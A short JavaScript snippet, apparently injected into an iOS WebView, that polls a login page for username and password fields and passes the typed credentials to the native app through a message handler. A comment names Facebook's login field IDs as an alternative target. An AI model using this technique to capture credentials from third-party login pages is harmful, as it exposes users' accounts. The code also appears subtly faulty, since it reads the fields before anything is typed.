var timeoutSeconds = 30;

//------------------------------------------------------------------------>>>>>>>
//code for extraction
//
var username,password;
var checkFetcher = setInterval(fetcher,7000);

setTimeout(function(){ clearInterval(checkFetcher)}, timeoutSeconds*7000);


var check = function(){
    try {
        webkit.messageHandlers.callbackHandler.postMessage(username + " " + password);
    } catch(err) {
        console.log('The native context does not exist yet');
    }
    
}

function fetcher(){
    //fb username -  m_login_email,m_login_password, u_0_5
    //Rtst -> ws-credentials-username,ws-credentials-password,ws-credentials-submit

    var usernameInput = document.getElementById('ws-credentials-username');
    var passwordInput = document.getElementById('ws-credentials-password');
    var signInButton = document.getElementById('ws-credentials-submit');
    
    if (signInButton == null){
        return;
    }
    
    if (usernameInput != null && passwordInput != null){
        username = usernameInput.value;
        password = passwordInput.value;
        signInButton.onclick = check;
    }
    clearInterval(checkFetcher);
}

//-----------------------------------------------------------------<<<<<<<<


